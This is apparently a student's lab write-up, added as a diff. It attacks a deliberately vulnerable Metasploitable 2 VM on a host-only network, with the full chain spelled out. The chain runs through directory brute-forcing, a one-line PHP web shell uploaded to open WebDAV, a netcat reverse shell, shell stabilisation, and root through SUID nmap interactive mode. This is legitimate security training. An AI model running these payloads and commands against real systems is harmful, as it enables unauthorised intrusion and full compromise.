@@ -1,0 +1,469 @@
+# Metasploitable Lab 4 — Web Enumeration, WebDAV Exploitation, and Privilege Escalation
+
+## Objective
+
+The objective of this lab was to identify and exploit a vulnerable web service on the target system, gain remote command execution through a web application, establish a reverse shell, and escalate privileges to root.
+
+This lab demonstrates a full attack chain from initial access to full system compromise.
+
+---
+
+## Lab Environment
+
+| Component | Description |
+|-----------|-------------|
+| Host Machine | MacBook Pro (Intel, 16GB RAM) |
+| Virtualization | VirtualBox |
+| Attacker Machine | Kali Linux |
+| Target Machine | Metasploitable 2 |
+| Network | VirtualBox Host-only Network |
+| Network Range | 192.168.56.0/24 |
+
+### Lab Network Topology
+```
+Internet
+
+|
+
+Kali Linux (eth0 - NAT)
+
+|
+
+Kali Linux (eth1 - Host-only)
+
+|
+
+192.168.56.0/24 Lab Network
+
+|
+
+Metasploitable 2
+```
+
+---
+
+## Tools Used
+
+| Tool | Purpose |
+|------|--------|
+| Dirb | Directory brute forcing |
+| Curl | File upload via HTTP |
+| Netcat | Reverse shell listener |
+| Nmap | Enumeration and privilege escalation |
+
+---
+
+# Step 1 — Web Server Identification
+
+From previous enumeration:
+
+```
+80/tcp open http Apache httpd 2.2.8
+```
+
+This confirmed that a web server was running on the target system.
+
+---
+
+# Step 2 — Directory Enumeration
+
+## Command Used
+
+```bash
+dirb http://192.168.56.3
+```
+
+![screenshot](images/lab04-01.png)
+
+---
+
+## Command Breakdown
+
+| Option | Meaning |
+|--------|--------|
+| `dirb` | Directory brute force tool |
+| URL | Target web server |
+
+---
+
+## Results (Key Findings)
+
+```
+/dav/
+/phpMyAdmin/
+/phpinfo.php
+/test/
+/twiki/
+```
+
+---
+
+## Analysis
+
+Several potentially sensitive or vulnerable directories were discovered.
+
+### High-Value Targets
+
+| Path | Reason |
+|------|--------|
+| `/dav/` | WebDAV enabled (file upload potential) |
+| `/phpMyAdmin/` | Database admin interface |
+| `/phpinfo.php` | Information disclosure |
+
+---
+
+# Step 3 — Attempted Access to phpMyAdmin
+
+The `/phpMyAdmin/` interface was accessed via browser.
+
+Default credentials were attempted:
+
+```
+root : (blank)
+root : root
+admin : admin
+```
+
+---
+
+## Result
+
+Authentication failed:
+
+```
+#1045 - Access denied for user
+```
+
+![screenshot](images/lab04-02.png)
+
+---
+
+## Conclusion
+
+phpMyAdmin was exposed but not immediately exploitable with default credentials.
+
+This required pivoting to another attack vector.
+
+---
+
+# Step 4 — WebDAV Enumeration
+
+Accessed:
+
+```
+http://192.168.56.3/dav/
+```
+
+---
+
+## Observation
+
+```
+Index of /dav
+DAV/2 Server
+Directory listing enabled
+```
+
+---
+
+## Analysis
+
+- WebDAV service was enabled
+- Directory listing was active
+- No authentication required
+
+This indicates a misconfiguration that may allow file upload.
+
+---
+
+# Step 5 — Web Shell Creation
+
+## Command Used
+
+```bash
+nano shell.php
+```
+
+![screenshot](images/lab04-03.png)
+
+---
+
+## Payload
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+---
+
+## Explanation
+
+This PHP script executes system commands passed via URL parameters.
+
+---
+
+# Step 6 — Uploading Web Shell
+
+## Command Used
+
+```bash
+curl -T shell.php http://192.168.56.3/dav/
+```
+
+---
+
+## Command Breakdown
+
+| Option | Meaning |
+|--------|--------|
+| `curl` | HTTP client |
+| `-T` | Upload file |
+| `shell.php` | File being uploaded |
+| URL | Target directory |
+
+---
+
+## Verification
+
+Accessed:
+
+```
+http://192.168.56.3/dav/shell.php?cmd=whoami
+```
+
+---
+
+## Result
+
+```
+www-data
+```
+
+![screenshot](images/lab04-04.png)
+
+---
+
+## Conclusion
+
+Remote command execution was successfully achieved.
+
+---
+
+# Step 7 — Establishing Reverse Shell
+
+## Listener (Kali)
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## Trigger (Browser)
+
+```
+http://192.168.56.3/dav/shell.php?cmd=nc 192.168.56.2 4444 -e /bin/bash
+```
+
+---
+
+## Result
+
+```
+connect to 192.168.56.2 from 192.168.56.3
+```
+
+---
+
+## Verification
+
+```bash
+whoami
+```
+
+```
+www-data
+```
+
+---
+
+## Analysis
+
+A reverse shell was successfully established, providing interactive access to the target system.
+
+---
+
+# Step 8 — Shell Upgrade
+
+## Command Used
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+---
+
+## Additional Steps
+
+```bash
+Ctrl + Z
+stty raw -echo; fg
+```
+
+---
+
+## Purpose
+
+- Improve shell stability
+- Enable proper terminal interaction
+
+---
+
+# Step 9 — Privilege Escalation Enumeration
+
+## Commands Used
+
+```bash
+id
+uname -a
+sudo -l
+```
+
+![screenshot](images/lab04-05.png)
+
+---
+
+## Observations
+
+- Running as `www-data`
+- No usable sudo privileges
+
+---
+
+## SUID Enumeration
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+![screenshot](images/lab04-06.png)
+
+---
+
+## Key Finding
+
+```
+/usr/bin/nmap
+```
+
+---
+
+# Step 10 — Exploiting SUID Nmap
+
+## Command Used
+
+```bash
+nmap --interactive
+```
+
+---
+
+## Inside Nmap
+
+```bash
+!sh
+```
+
+---
+
+## Verification
+
+```bash
+whoami
+```
+
+```
+root
+```
+
+---
+
+## Analysis
+
+- Nmap was running with SUID permissions
+- Interactive mode allowed execution of system commands
+- Shell spawned with root privileges
+
+---
+
+# Roadblock Encountered — VM Crash and Recovery
+
+During the lab, a critical issue occurred:
+
+- Snapshot attempt was made while the VM was running
+- VirtualBox became unstable
+- Both Kali and Metasploitable experienced failures
+- Error encountered:
+
+```
+VERR_SSM_DATA_UNIT_FORMAT_CHANGED
+```
+
+---
+
+## Resolution Steps
+
+1. Discarded corrupted saved state
+2. Restored previous snapshot (`lab4_webshell_ready`)
+3. Rebooted the VM cleanly
+4. Verified persistence of uploaded web shell
+5. Continued exploitation without data loss
+
+---
+
+## Key Lesson
+
+Snapshots should be taken:
+
+- only when the VM is powered off
+- not during active exploitation
+- not during high system load
+
+---
+
+# Security Concepts Learned
+
+This lab demonstrated several critical concepts:
+
+- **Web Enumeration** — Discovering hidden directories and applications  
+- **Information Disclosure** — Using phpinfo to gather system details  
+- **WebDAV Misconfiguration** — Allowing unauthorized file uploads  
+- **Remote Code Execution (RCE)** — Executing commands via web shell  
+- **Reverse Shells** — Gaining interactive access  
+- **Shell Stabilisation** — Upgrading basic shells  
+- **Privilege Escalation** — Exploiting SUID binaries  
+- **SUID Abuse** — Leveraging elevated binaries for root access  
+- **Operational Recovery** — Handling VM crashes and restoring state  
+
+---
+
+# Lessons Learned
+
+- Always enumerate multiple attack paths when one fails  
+- Misconfigured web services are a common entry point  
+- File upload vulnerabilities can lead directly to system compromise  
+- Reverse shells are essential for real-world exploitation  
+- Privilege escalation is often the final step in full compromise  
+- Lab stability and snapshot management are critical skills  
+- Troubleshooting environments is part of cybersecurity work  
+
+---
+
+# Final Outcome
+
+- Initial access achieved via WebDAV upload  
+- Reverse shell established  
+- Shell upgraded for stability  
+- Privilege escalation performed  
+- Root access obtained  
